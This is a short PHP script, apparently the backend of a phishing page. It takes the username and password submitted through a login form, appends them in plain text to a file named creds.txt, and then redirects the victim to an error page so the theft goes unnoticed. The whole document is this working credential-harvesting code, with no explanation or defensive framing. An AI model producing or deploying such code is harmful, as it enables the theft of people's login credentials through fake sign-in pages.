<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $data = "Username: $username \nPassword: $password \n\n";

    file_put_contents("creds.txt", $data, FILE_APPEND);

    header("Location: error.html");
    exit();
}
?>
